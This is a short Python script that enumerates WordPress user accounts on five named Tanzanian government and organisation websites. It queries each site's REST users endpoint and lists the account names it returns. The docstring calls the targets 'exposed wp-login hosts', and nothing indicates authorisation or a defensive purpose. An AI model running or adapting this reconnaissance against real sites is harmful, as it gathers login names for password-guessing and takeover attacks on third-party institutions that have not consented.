"""WP user enumeration across the exposed wp-login hosts."""
import json
import sys

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

for host in ("www.ncaa.go.tz", "www.nimr.or.tz", "www.ptf.or.tz",
             "www.sbt.go.tz", "www.tagla.go.tz"):
    r = scan.fetch(f"https://{host}/wp-json/wp/v2/users")
    if not r:
        print(f"{host:22} DOWN")
        continue
    if r["status"] != 200:
        print(f"{host:22} [{r['status']}] users endpoint closed")
        continue
    try:
        data = json.loads(r["body"])
    except Exception:
        print(f"{host:22} unparsable")
        continue
    print(f"{host:22} {len(data)} user(s):",
          ", ".join(u.get("slug", "?") for u in data))
